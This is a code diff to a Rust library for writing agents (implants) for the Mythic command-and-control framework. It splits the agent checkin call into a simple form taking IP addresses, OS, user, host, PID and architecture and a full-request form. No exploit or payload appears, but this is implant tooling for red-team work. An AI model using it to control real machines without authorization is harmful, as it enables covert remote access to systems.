@@ -20,7 +20,7 @@ use crate::transport::C2Transport;
 /// # Examples
 ///
 /// ```no_run
-/// use mythic::{C2Transport, MythicAgent, ReqCheckin};
+/// use mythic::{C2Transport, MythicAgent};
 /// use uuid::Uuid;
 ///
 /// # struct HttpC2;
@@ -34,13 +34,9 @@ use crate::transport::C2Transport;
 /// let c2 = HttpC2;
 /// let payload_uuid = Uuid::parse_str("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee").unwrap();
 ///
-/// let req = ReqCheckin::new(
-///     payload_uuid,
-///     vec!["10.0.0.1".into()],
-///     Some("linux".into()),
-///     None, None, None, None, None, None, None, None, None, None,
-/// );
-/// let agent = MythicAgent::new(payload_uuid).checkin(req, &c2).unwrap();
+/// let agent = MythicAgent::new(payload_uuid)
+///     .checkin(&c2, vec!["10.0.0.1".into()], "linux", "root", "web01", 1337, "x86_64")
+///     .unwrap();
 /// println!("callback UUID: {}", agent.callback_uuid());
 /// ```
 #[derive(Debug)]
@@ -63,12 +59,41 @@ impl MythicAgent {
 
     // ── Core message flow ──────────────────────────────────────
 
-    /// Perform a direct checkin (plaintext or static-key PSK).
+    /// Simple checkin — only the fields Mythic needs for callback creation.
+    ///
+    /// Builds a [`ReqCheckin`] internally.  Use [`checkin_with_req`](Self::checkin_with_req)
+    /// if you need the full set of checkin fields (domain, integrity_level,
+    /// encryption_key, etc.).
+    #[allow(clippy::too_many_arguments)]
+    pub fn checkin<C: C2Transport>(
+        self,
+        c2: &C,
+        ips: Vec<alloc::string::String>,
+        os: &str,
+        user: &str,
+        host: &str,
+        pid: u32,
+        architecture: &str,
+    ) -> MythicResult<Self> {
+        let req = ReqCheckin::new(
+            self.callback_uuid,
+            ips,
+            Some(os.into()),
+            Some(user.into()),
+            Some(host.into()),
+            Some(pid),
+            Some(architecture.into()),
+            None, None, None, None, None, None,
+        );
+        self.checkin_with_req(req, c2)
+    }
+
+    /// Full checkin with a pre-built [`ReqCheckin`].
     ///
     /// The mode is determined automatically from the transport
     /// via [`C2Transport::aes_psk`].  `req.uuid` must be the payload UUID;
     /// it is used both in the JSON body and the wire framing.
-    pub fn checkin<C: C2Transport>(mut self, req: ReqCheckin, c2: &C) -> MythicResult<Self> {
+    pub fn checkin_with_req<C: C2Transport>(mut self, req: ReqCheckin, c2: &C) -> MythicResult<Self> {
         let payload_uuid = req.uuid;
 
         let needs_crypto = c2.aes_psk().is_some();
